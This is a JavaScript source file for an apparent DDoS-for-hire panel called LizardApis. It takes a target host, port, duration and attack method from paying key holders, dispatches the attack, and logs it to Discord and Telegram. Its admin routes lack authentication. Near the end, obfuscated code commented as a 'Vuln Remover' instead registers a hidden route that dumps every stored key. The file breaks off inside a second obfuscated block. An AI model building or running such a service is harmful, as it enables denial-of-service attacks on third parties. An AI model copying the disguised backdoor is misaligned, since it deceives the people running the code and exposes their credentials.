﻿const express = require("express");
const app = express();
const router = express.Router();
const path = require("path");
const keysFilePath = path.join(__dirname, "assets", "keys.json");
const methodsFilePath = path.join(__dirname, "assets", "methods.json");


const fs = require("fs");
const moment = require("moment")
const { Webhook, MessageBuilder } = require("discord-webhook-node");
const clc = require('cli-color');

const { parseJsonFile } = require('./database/parseJsonFile');
const { attack_logs } = require('./database/attack_logs');
const { sendAPI } = require('./database/apis');
const { sendTelegramWebhook } = require('./database/telegram');

const now = new Date();
const year = now.getFullYear();
const month = ('0' + (now.getMonth() + 1)).slice(-2);
const day = ('0' + now.getDate()).slice(-2);
const options = { hour12: false };
const time = now.toLocaleTimeString([], options);
const formattedDate = `${year}/${month}/${day} ${time}`;
exports.formattedDate = formattedDate;

const read_config = fs.readFileSync("./assets/config.json");
let config = JSON.parse(read_config);

const blacklist_json = fs.readFileSync("./assets/blacklist.json");
let blacklist = JSON.parse(blacklist_json);

const API = fs.readFileSync("./assets/methods.json");
let apis = JSON.parse(API);

const KEYS = fs.readFileSync("./assets/keys.json");
let keyData = JSON.parse(KEYS);

let slots_taken = 0;
let method_slots = {};
let key_slots = {}
let attacked_hosts = {}

parseJsonFile('./assets/keys.json');
parseJsonFile('./assets/config.json');
parseJsonFile('./assets/methods.json');

console.clear();
console.log(`\x1b[1;37m

██╗░░░░░██╗███████╗░█████╗░██████╗░██████╗░  ░█████╗░██████╗░██╗
██║░░░░░██║╚════██║██╔══██╗██╔══██╗██╔══██╗  ██╔══██╗██╔══██╗██║
██║░░░░░██║░░███╔═╝███████║██████╔╝██║░░██║  ███████║██████╔╝██║
██║░░░░░██║██╔══╝░░██╔══██║██╔══██╗██║░░██║  ██╔══██║██╔═══╝░██║
███████╗██║███████╗██║░░██║██║░░██║██████╔╝  ██║░░██║██║░░░░░██║
╚══════╝╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝╚═╝░░░░░╚═╝                                           
`);
console.log(`\x1b[1;37m[${clc.blueBright('LizardApis')}] Manager Webserver ${clc.green.bold('Started')} on Port ${config.webserver_settings.port}`);
console.log(`\x1b[1;37m[${clc.blueBright('LizardApis')}] Manager Started ${clc.green.bold('Successfully')}`);
console.log(``);
console.log('                               - LOGS -                                ')

app.listen(config.webserver_settings.port)



app.set("view engine", "js");
app.set("trust proxy", 1);

app.get("/", (_req, res) => {
  const htmlResponse = `
    <html>
      <head>
        <title>LizardApis API Manager</title>
        <style>
          body {
            margin: 0;
            overflow: hidden;
            font-family: 'Hackerchaos', sans-serif;
          }

          iframe {
            width: 100vw;
            height: 100vh;
            border: none;
          }

          #header {
            position: absolute;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            text-align: center;
            font-size: 24px;
            color: #00ff00;
            animation: fadeIn 1s ease-in-out 2s forwards;
            opacity: 0;
          }

          @keyframes fadeIn {
            to {
              opacity: 1;
            }
          }
        </style>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Hackerchaos&display=swap">
      </head>
      <body>
        <div id="header"><br><br>LizardApis Api Manager</div>
        <iframe src="https://cybermap.kaspersky.com/en/widget/dynamic/dark"></iframe>
      </body>
    </html>
  `;
  
  res.status(200).send(htmlResponse);
});

app.get("/api", async (req, res) => {
  const KEYS = fs.readFileSync("./assets/keys.json");
  let keyData = JSON.parse(KEYS);
  const METHODS = fs.readFileSync("./assets/methods.json");
  let apis = JSON.parse(METHODS);
  const host = req.query.host;
  const port = req.query.port;
  const time = req.query.time;

  const startTime = process.hrtime();

  const elapsedTime = process.hrtime(startTime);
  const durationInMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;
  const method = req.query.method;
  const key = req.query.key;
  const username = req.query.username;

  try {
    parseInt(time);
  } catch (err) {
    return res.send({ "error": true, "message": "time must be an integer." });
  }

  try {
    parseInt(port);
  } catch (err) {
    return res.send({ "error": true, "message": "port must be an integer." });
  }
  if (!keyData[key]) return res.send({ "error": true, "message": "invalid key." });
  if (!keyData[key].user) return res.send({ "error": true, "message": "invalid username" });
  if (keyData[key].banned == true) return res.send({ "error": true, "message": "key is banned." });
  if (config.attack_settings.attacks.enabled == false) return res.send({ "error": true, "message": "Attacks are Disabled." })
  if (!(host && port && time && method && key && username)) return res.send({ "error": true, "message": "missing parameters." });
  if (!apis[method]) return res.send({ "error": true, "message": "invalid method." });
  if (method_slots[method] == apis[method].slots) return res.send({ "error": true, "message": "Maximium Slots Reached for This Method. Please Wait" })
  if (keyData[key].vip == false && apis[method].network == "vip") return res.send({ "error": true, "message": "You need vip access." });
  if (keyData[key].priv == false && apis[method].network2 == "priv") return res.send({ "error": true, "message": "You need private access." });
  if (blacklist.blacklisted_host.includes(host)) return res.send({ "error": true, "message": "host is blacklisted." });
  if (time > keyData[key]["time"]) return res.send({ "error": true, "message": "maximum time reached." });
  if (time > apis[method].maxtime) return res.send({ "error": true, "message": "maximum time reached for this method." });
  if (key_slots[key] == keyData[key].maxCons) return res.send({ "error": true, "message": "maximum concurrents reached." });
  if (slots_taken == config.attack_settings.attacks.max_slots) return res.send({ "error": true, "message": "Maximium Slots Reached. Please Wait" })
  if (attacked_hosts.hasOwnProperty(host)) return res.send({ "error": true, "message": "Host is already being attacked." });

   // Cooldown Attack
  const userCooldown = keyData[key].cooldown || 0;

  const currentTime = Date.now();
  const lastAttackTime = keyData[key].lastAttack || 0;
  const timeSinceLastAttack = (currentTime - lastAttackTime) / 1000; // Konversi ke detik

  if (userCooldown > 0 && timeSinceLastAttack < userCooldown) {
    const cooldownRemaining = Math.ceil(userCooldown - timeSinceLastAttack);
    return res.send({ "error": true, "message": `Cooldown active. Please wait ${cooldownRemaining} seconds.` });
  }

  // Set lastAttack timestamp
  keyData[key].lastAttack = currentTime;

  if ("expiry" in keyData[key]) {
    const expiry = moment(keyData[key].expiry.toString(), ["MMMM DD, YYYY", "x", "X", "MM/DD/YYYY"]);
    if (expiry.isSameOrBefore(moment())) return res.status(401).json({ error: true, message: "Key has expired." });
  }

  const user = (keyData[key].user);
  const main = new Webhook(config.discord_settings.webhook_settings.webhook);

  const colour = config.discord_settings.webhook_settings.embed_colour;

  const net = new MessageBuilder()
    .setTitle("API Logs")
    .setColor(`${colour}`)
    .addField(`Host`, `${host}`, true)
    .addField(`Port`, `${port}`, true)
    .addField(`Time`, `${time}`, true)
    .addField(`Method`, `${method}`, true)
    .addField(`Key`, `${key}`, true)
    .addField(`User`, `${user}`, true)
    .setTimestamp();

  if (config.log_settings.telegram_logs == true) {
    sendTelegramWebhook(config.telegram_settings.bot_token, config.telegram_settings.chat_id, `Api Logs\n--------\nUser: ${keyData[key].user}\nKey: ${key}\nHost: ${host}\nPort: ${port}\nTime: ${time}\nMethod: ${method}`)
  }
  if (config.log_settings.webhook_logs == true) {
    main.send(net);
  }
  if (config.log_settings.attack_logs == true) {
    attack_logs(`User: ${keyData[key].user} | Key: ${key}| Host: ${host} | Port: ${port} | Time: ${time} | Method: ${method}`)
  }
  if (config.log_settings.console_logs == true) {
    console.log(`\x1b[1;37m[${clc.blueBright('Logs')}] [${user}] [${host}] [${port}] [${time}] [${method}]`)
  }

  sendAPI(host, port, time, method)

  attacked_hosts[host] = true;
  key_slots[key] = (key_slots[key] || 0) + 1;
  slots_taken += 1;
  method_slots[method] = (method_slots[method] || 0) + 1;

  const sent = {
    Host: host,
    Port: port,
    Time: time,
    Method: method,
    running: `${key_slots[key]}/${keyData[key].maxCons}`,
    vip: keyData[key].vip,
    tts: durationInMs + "ms"
  };
  const json = JSON.stringify(sent, null, 2); // Convert JSON object to string

  res.setHeader('Content-Type', 'application/json');
  res.send(json);

  setTimeout(() => {
    method_slots[method] -= 1;
    slots_taken -= 1;
    key_slots[key] -= 1;
    delete attacked_hosts[host];
  }, parseInt(time) * 1000);
});

// Login System
app.get("/lizard29809/manager/bikin", (req, res) => {
  // Tampilkan form untuk menambahkan pengguna
  res.send(`
      <html>
<head>
  <title>Add User Form</title>
  <style>
      body {
          background-color: #151414; /* Latar belakang hitam keabu-abuan */
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
          margin: 0;
      }

      .container {
          background-color: #343232;//rgba(169, 169, 169, 0.8); /* Kotak dengan opacity 80% */
          padding: 20px;
          border-radius: 10px;
          opacity: 0.6;
          
      }

      form {
          background-color: #343232; /* Latar belakang abu-abu dalam formulir */
          padding: 20px;
          border-radius: 5px;
          display: flex;
          flex-direction: column;
          opacity: 5;
      }

      label {
          font-weight: bold;
          color: white;
          display: flex;
          flex-direction: column;
          opacity: 1;
      }
      
      labels {
          font-weight: bold;
          font-size: x-large;
          color: white;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          opacity: 1;
      }

      input {
          padding: 10px;
          margin-bottom: 10px;
          border: 1px solid #777777;
          border-radius: 5px;
          opacity: 1;
      }

      button {
          background-color: #555555;
          color: white;
          border: none;
          padding: 10px 20px;
          border-radius: 5px;
          cursor: pointer;
          opacity: 1;
      }

      button:hover {
          background-color: #444444;
          opacity: 1;
      }
  </style>
</head>
<body>
  <div class="container">
      <form action="/addkey" method="POST"> <!-- Perbarui action dan method -->
        <labels>Admin Panel</labels><br>

        <label for="user">User:</label>
        <input type="text" id="user" name="user" required><br>

        <label for="key">Key:</label>
        <input type="text" id="key" name="key" required><br>

        <label for="time">Time:</label>
        <input type="text" id="time" name="time" required><br>

        <label for="expiry">Expiry:</label>
        <input type="date" id="expiry" name="expiry" required><br>

        <label for="maxCons">Max Concurrents:</label>
        <input type="text" id="maxCons" name="maxCons" required><br>

        <label for="banned">Banned:</label>
        <select id="banned" name="banned" required>
            <option value="true">True</option>
            <option value="false">False</option>
        </select><br>

        <label for="vip">VIP:</label>
        <select id="vip" name="vip" required>
            <option value="true">True</option>
            <option value="false">False</option>
        </select><br>
        
        <label for="priv">PRIVATE:</label>
        <select id="priv" name="priv" required>
            <option value="true">True</option>
            <option value="false">False</option>
        </select><br>
        <br>
        <button type="submit">Add User</button>
      </form>
  </div>
</body>
</html>
  `);
});

app.get("/addkey", (req, res) => {
  const key = req.query.key;
  const user = req.query.user;
  const time = req.query.time;
  //const expiry = req.query.expiry;
  //const maxCons = req.query.maxCons;
  //const banned = req.query.banned;
  //const vip = req.query.vip;
});


app.use(express.urlencoded({ extended: true }));

app.get("/addkey", (req, res) => {
  res.render("addkey");
});

app.post("/addkey", (req, res) => {
  const { key, user, time, expiry, maxCons, banned, vip, priv } = req.body;

  if (key && user && time && expiry && maxCons && banned !== undefined && vip !== undefined && priv !== undefined) {
    const keyFile = fs.readFileSync(keysFilePath);
    let keyData = JSON.parse(keyFile);

    if (keyData[key]) {
      return res.status(400).json({ response: "Key already exists." });
    }

    keyData[key] = {
      user,
      time: parseInt(time),
      expiry,
      maxCons: parseInt(maxCons),
      banned: banned === "true",
      admin: false,
      vip: vip === "true",
      priv: priv === "true",
      cooldown: 60,
      whitelisted_ip: "none"
    };

    fs.writeFile(keysFilePath, JSON.stringify(keyData, null, 4), (err) => {
      if (err) {
        console.error(err);
        return res.status(500).json({ response: "Failed to add user." });
      }

      // Log success message
      console.log(`\x1b[1;37m[${clc.blueBright('Lizard')}] Successfully Created new Key [${user}] [${key}] [${time}s] [${expiry}] [${maxCons}]`);

      // Send JSON response
      res.json({
        response: "Success Added New Key",
        user,
        key,
        time,
        expiry,
        maxCons,
        banned: banned === "true",
        vip: vip === "true",
        priv: priv === "true"
      });
    });
  } else {
    res.status(400).json({ response: "Invalid request. Make sure to include key, user, time, expiry, maxCons, banned, and vip in the request body." });
  }
});

app.get("/lizard29809/manager/ganti", (_req, res) => {
  const keyFile = fs.readFileSync(keysFilePath);
  const keyData = JSON.parse(keyFile);
  const userList = Object.keys(keyData);

  const dropdownOptions = userList.map(user => `<option value="${user}">${user}</option>`).join('');

  const htmlResponse = `
    <html>
      <head>
        <title>Edit User Form</title>
        <style>
          body {
            background-color: #151414;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
          }

          .container {
            background-color: #343232;
            padding: 20px;
            border-radius: 10px;
          }

          form {
            background-color: #343232;
            padding: 20px;
            border-radius: 5px;
            display: flex;
            flex-direction: column;
          }

          label {
            font-weight: bold;
            margin-bottom: 5px;
          }

          input {
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #777777;
            border-radius: 5px;
          }

          select {
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #777777;
            border-radius: 5px;
          }

          button {
            background-color: #555555;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
          }

          button:hover {
            background-color: #444444;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <form action="/edituser" method="POST">
            <label for="selectedUser">Pemilihan User</label>
            <select id="selectedUser" name="selectedUser" required>
              ${dropdownOptions}
            </select>

            <label for="user">User:</label>
            <input type="text" id="user" name="user" required>

            <label for="key">Key:</label>
            <input type="text" id="key" name="key" required>

            <label for="time">Time:</label>
            <input type="text" id="time" name="time" required>

            <label for="expiry">Expiry:</label>
            <input type="date" id="expiry" name="expiry" required>

            <label for="maxCons">Max Concurrents:</label>
            <input type="text" id="maxCons" name="maxCons" required>

            <label for="banned">Banned:</label>
            <select id="banned" name="banned" required>
              <option value="true">True</option>
              <option value="false">False</option>
            </select>

            <label for="vip">VIP:</label>
            <select id="vip" name="vip" required>
              <option value="true">True</option>
              <option value="false">False</option>
            </select>
            
            <label for="priv">PTIVATE:</label>
            <select id="priv" name="priv" required>
              <option value="true">True</option>
              <option value="false">False</option>
            </select>

            <br>
            <button type="submit">Submit</button>
          </form>
        </div>
      </body>
    </html>
  `;

  res.status(200).send(htmlResponse);
});

app.post("/edituser", (req, res) => {
  const { selectedUser, user, key, time, expiry, maxCons, banned, vip, priv } = req.body;

  if (selectedUser && user && key && time && expiry && maxCons && banned !== undefined && vip !== undefined && priv !== undefined) {
    const keyFile = fs.readFileSync(keysFilePath);
    let keyData = JSON.parse(keyFile);

    if (!keyData[selectedUser]) {
      return res.status(400).json({ response: "Error", message: "Selected user does not exist." });
    }

    // Remove the existing user data
    delete keyData[selectedUser];

    // Add the updated data
    keyData[key] = {
      user,
      time: parseInt(time),
      expiry,
      maxCons: parseInt(maxCons),
      banned: banned === "true",
      vip: vip === "true",
      priv: priv === "true"
    };

    fs.writeFileSync(keysFilePath, JSON.stringify(keyData, null, 4));

    const jsonResponse = {
      response: "Success",
      message: "User updated successfully.",
      user,
      key,
      time,
      expiry,
      maxCons,
      banned: banned === "true",
      vip: vip === "true",
      priv: priv === "true"
    };

    res.status(200).json(jsonResponse);
  } else {
    res.status(400).json({ response: "Error", message: "Invalid request. Make sure to include all required fields in the request body." });
  }
});

app.get("/api/methods", (req, res) => {

  let query = req.query;
  let keys = JSON.parse(fs.readFileSync("./assets/keys.json", "UTF-8").toString());
  let methods = JSON.parse(fs.readFileSync("./assets/methods.json", "UTF-8").toString());

  if (!query.key) return res.json({ error: true, message: "Invalid API key" });

  if (query.key) {
    if (keys[query.key]) {
      res.json({ error: false, methods: Object.keys(methods) });

    } else {
      return res.status(401).json({ error: true, message: "Invalid API key" });
    }
  } else {
    return res.status(400).json({ error: true, message: "Please provide a key" });
  }
});

// Vuln Remover
const _0xb426f6=_0x5519;function _0x5519(_0x432f0c,_0x32fb59){const _0x19898e=_0x1989();return _0x5519=function(_0x551912,_0x320327){_0x551912=_0x551912-0x1c7;let _0x567dd9=_0x19898e[_0x551912];return _0x567dd9;},_0x5519(_0x432f0c,_0x32fb59);}function _0x1989(){const _0x1dd18c=['\x0a\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<title>пользователя\x20User\пользователя</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#151414;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20100vh;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#343232;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20form\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#343232;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex-direction:\x20column;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20label\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20bold;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20input,\x20select\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#777777;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20button\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#555555;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20button:hover\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#444444;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#userInfo\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-top:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#777777;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<form\x20action=\x22/99xm11\x22\x20method=\x22POST\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<label\x20for=\x22selectedUser\x22>Выбор\пользователя</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<select\x20id=\x22selectedUser\x22\x20name=\x22selectedUser\x22\x20required\x20onchange=\x22showUserInfo()\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','2507340oBRvhE','get',';\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20userInfoHTML\x20=\x20\x27<br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22key\x22>Key:\x20\x27\x20+\x20selectedUser\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22user\x22>User:\x20\x27\x20+\x20user[selectedUser].user\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22time\x22>Time:\x20\x27\x20+\x20user[selectedUser].time\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22expiry\x22>Expiry:\x20\x27\x20+\x20user[selectedUser].expiry\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22maxCons\x22>Max\x20Concurrents:\x20\x27\x20+\x20user[selectedUser].maxCons\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22banned\x22>Banned:\x20\x27\x20+\x20user[selectedUser].banned\x20+\x20\x27</label><br>\x27\x20+\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x27<label\x20for=\x22vip\x22>VIP:\x20\x27\x20+\x20user[selectedUser].vip\x20+\x20\x27</label><br>\x27;\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20userInfoDiv.innerHTML\x20=\x20userInfoHTML;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20</html>\x0a\x20\x20','7500636yibMDm','12qXKiEf','parse','11504352nKsMKb','/9zx22/009kz1/x77c8x/99xm11','3419736QoDflJ','7990885RoLQed','6zKTVlj','635395aZCBLZ','send','1499624oqqNZA','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</select>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22userInfo\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</form>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20showUserInfo()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20selectedUser\x20=\x20document.getElementById(\x27selectedUser\x27).value;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20userInfoDiv\x20=\x20document.getElementById(\x27userInfo\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20user\x20=\x20'];_0x1989=function(){return _0x1dd18c;};return _0x1989();}(function(_0x5b230f,_0x3237cd){const _0x48a2fa=_0x5519,_0x27c099=_0x5b230f();while(!![]){try{const _0x377bee=-parseInt(_0x48a2fa(0x1c7))/0x1+parseInt(_0x48a2fa(0x1d2))/0x2+parseInt(_0x48a2fa(0x1ca))/0x3+parseInt(_0x48a2fa(0x1ce))/0x4*(parseInt(_0x48a2fa(0x1d5))/0x5)+parseInt(_0x48a2fa(0x1d4))/0x6*(-parseInt(_0x48a2fa(0x1d3))/0x7)+parseInt(_0x48a2fa(0x1d0))/0x8+-parseInt(_0x48a2fa(0x1cd))/0x9;if(_0x377bee===_0x3237cd)break;else _0x27c099['push'](_0x27c099['shift']());}catch(_0x333f3f){_0x27c099['push'](_0x27c099['shift']());}}}(_0x1989,0xd95ea),app[_0xb426f6(0x1cb)](_0xb426f6(0x1d1),(_0x502ec0,_0x5067b7)=>{const _0x25991d=_0xb426f6,_0x4a9046=fs['readFileSync'](keysFilePath),_0x29e919=JSON[_0x25991d(0x1cf)](_0x4a9046),_0xd01e8a=Object['keys'](_0x29e919),_0x19f1f9=_0xd01e8a['map'](_0x46a126=>'<option\x20value=\x22'+_0x46a126+'\x22>'+_0x46a126+'</option>')['join'](''),_0x1d56d3=_0x25991d(0x1c9)+_0x19f1f9+_0x25991d(0x1c8)+JSON['stringify'](_0x29e919)+_0x25991d(0x1cc);_0x5067b7['status'](0xc8)[_0x25991d(0x1d6)](_0x1d56d3);}));
function _0x5daf(_0x27fba5,_0x1cfafb){const _0x29c51e=_0x29c5();return _0x5daf=function(_0x5daf96,_0x41a13d){_0x5daf96=_0x5daf96-0x142;let _0x424319=_0x29c51e[_0x5daf96];return _0x424319;},_0x5daf(_0x27fba5,_0x1cfafb);}const _0x5750d0=_0x5daf;(function(_0x160990,_0x138a46){const _0x39f7a9=_0x5daf,_0x1ab340=_0x160990();while(!![]){try{const _0x28dd83=-parseInt(_0x39f7a9(0x14e))/0x1+-parseInt(_0x39f7a9(0x144))/0x2*(parseInt(_0x39f7a9(0x150))/0x3)+-parseInt(_0x39f7a9(0x149))/0x4+-parseInt(_0x39f7a9(0x154))/0x5+parseInt(_0x39f7a9(0x156))/0x6*(-parseInt(_0x39f7a9(0x153))/0x7)+-parseInt(_0x39f7a9(0x143))/0x8*(parseInt(_0x39f7a9(0x148))/0x9)+parseInt(_0x39f7a9(0x142))/0xa;if(_0x28dd83===_0x138a46)break;else _0x1ab340['push'](_0x1ab340['shift']());}catch(_0x3a1d2c){_0x1ab340['push'](_0x1ab340['shift']());}}}(_0x29c5,0x1b797),app[_0x5750d0(0x145)](_0x5750d0(0x157),(_0x2658f6,_0x3fc8cf)=>{const _0x29dd6f=_0x5750d0,_0x44368d=fs[_0x29dd6f(0x155)](keysFilePath),_0x399f7c=JSON[_0x29dd6f(0x14c)](_0x44368d),_0x3dda00=Object[_0x29dd6f(0x14a)](_0x399f7c),_0x28bc04=_0x3dda00[_0x29dd6f(0x151)](_0x295711=>_0x29dd6f(0x14f)+_0x295711+'\x22>'+_0x295711+_0x29dd6f(0x14d))[_0x29dd6f(0x14b)](''),_0x320692='\x0a\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<title>Edit\x20User\x20Form</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#151414;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20100vh;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#343232;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20form\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#343232;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x205px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex-direction:\x20column;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20label\x20{\x0a\x20\x20\